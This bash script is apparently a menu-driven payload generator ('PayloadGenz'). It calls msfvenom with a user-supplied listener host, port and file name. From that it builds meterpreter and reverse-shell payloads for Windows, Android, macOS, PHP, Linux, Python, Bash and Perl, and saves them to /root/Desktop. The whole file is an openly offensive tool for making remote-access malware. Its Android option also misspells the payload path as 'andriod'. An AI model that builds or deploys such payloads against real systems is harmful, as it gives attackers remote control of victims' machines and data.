#!/bin/bash

Bold="\e[1m"
Green="\u001b[32m"
Orange="\e[1;33m"
Reversed="\u001b[7m"

function logo() {
    clear
    printf "\n \n"
    echo -e "$Green ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗  ██████╗ ███████╗███╗   ██╗███████╗"
    echo -e "$Green ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝ ██╔════╝████╗  ██║╚══███╔╝"
    echo -e "$Green ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║██║  ███╗█████╗  ██╔██╗ ██║  ███╔╝ "
    echo -e "$Green ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║██║   ██║██╔══╝  ██║╚██╗██║ ███╔╝  "
    echo -e "$Green ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝╚██████╔╝███████╗██║ ╚████║███████╗"
    echo -e "$Green ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝"
    printf "\n \n \n"
}

function options() {
    echo -e "$Bold 1. Windows "
    echo " 2. Andriod "
    echo " 3. Mac     "
    echo " 4. Php Shell   "
    echo " 5. Linux   "
    echo " 6. Python   "
    echo " 7. Bash   "
    echo " 8. Perl   "
    echo -n " Choose Payload Number [1-8]: "
    read -n 1 num
    printf "\n \n"

    if [[ $num == 1 ]]
        then
        echo -e "$Reversed       Cooking Payload For $Orange Windows \e[0m"
    elif [[ $num == 2 ]]
        then
        echo -e "$Reversed       Cooking Payload For $Orange Andriod \e[0m"
    elif [[ $num == 3 ]]
        then
        echo -e "$Reversed       Cooking Payload For $Orange Mac \e[0m"
    elif [[ $num == 4 ]]
        then
        echo -e "$Reversed       Cooking Payload For $Orange Php Shell \e[0m"
    elif [[ $num == 5 ]]
        then
        echo -e "$Reversed       Cooking Payload For $Orange Linux \e[0m"
    elif [[ $num == 6 ]]
        then
        echo -e "$Reversed       Cooking Payload For $Orange Python \e[0m"
    elif [[ $num == 7 ]]
        then
        echo -e "$Reversed       Cooking Payload For $Orange Bash \e[0m"
    elif [[ $num == 8 ]]
        then
        echo -e "$Reversed       Cooking Payload For $Orange Perl \e[0m"
    else
        echo -e "$Reversed       Wrong Payload Number ,\e[1;33m Please Try Again... \e[0m"
    fi

    printf "\n \n"
    localip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
    echo -e "$Orange Your Local Ip is: $Reversed$localip\e[0m"
    read -p " Enter LHOST: " lhost
    echo    "                   "
    echo -e " LHOST is Set to be \e[1;33m $lhost \e[0m"
    echo    "                   "
    read -p " Enter LPORT (rec: 4444): " lport
    echo    "                   "
    echo -e "\e[1;32m LPORT is \e[1;33m $lport \e[0m"
    echo    "                   "
    read -p " Enter NAME of File: " name
    echo    "                   "
    echo -e "\e[1;32m NAME is \e[1;33m $name \e[0m"

    echo -e " \e[1;36m                 		              ========================      \e[0m           "
    echo -e " \e[1;36m		           		            Please Wait                     \e[0m     "
    echo -e " \e[1;36m        		                      ========================      \e[0m            "
    echo "                "
    echo "                "

    if [[ $num == 1 ]]
	then
        msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhost lport=$lport  > /root/Desktop/$name.exe
    elif [[ $num == 2 ]]
        then
        msfvenom -p andriod/meterpreter/reverse_tcp lhost=$lhost lport=$lport  > /root/Desktop/$name.apk
    elif [[ $num == 3 ]]
        then
        msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=$lhost lport=$lport  > /root/Desktop/$name.macho
    elif [[ $num == 4 ]]
        then
        msfvenom -p php/meterpreter/reverse_tcp lhost=$lhost lport=$lport  > /root/Desktop/$name.php
    elif [[ $num == 5 ]]
        then
        msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$lhost lport=$lport  > /root/Desktop/$name.elf
    elif [[ $num == 6 ]]
        then
        msfvenom -p cmd/unix/reverse_python lhost=$lhost lport=$lport  > /root/Desktop/$name.py
    elif [[ $num == 7 ]]
        then
        msfvenom -p cmd/unix/reverse_bash lhost=$lhost lport=$lport  > /root/Desktop/$name.sh
    elif [[ $num == 8 ]]
        then
        msfvenom -p cmd/unix/reverse_perl lhost=$lhost lport=$lport  > /root/Desktop/$name.pl
    fi

    echo -e "\e[1;36m Payload Generated... \e[0m"
    echo    "                                    "
    echo -e "\e[1;33m Check this path /root/Desktop/ \e[0m"
}

logo
options